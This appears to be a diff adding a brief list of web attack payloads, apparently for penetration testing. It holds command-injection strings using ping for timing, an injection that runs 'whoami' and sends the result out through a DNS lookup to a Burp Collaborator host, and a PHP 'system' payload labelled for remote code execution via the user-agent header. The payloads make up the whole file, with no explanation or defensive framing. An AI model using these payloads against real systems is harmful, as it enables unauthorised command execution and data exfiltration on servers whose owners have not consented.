@@ -1,0 +1,11 @@
+||ping+-c+10+127.0.0.1||
+
+||ping+-c+10+127.0.0.1||
+
+||ping+-c+10+127.0.0.1||
+
+||nslookup+`whoami`.pmfjvovl29ltjjk9qe45uh0g076xum.burpcollaborator.net||
+
+user-agent  rce:
+
+<?php system('whoami'); ?> 
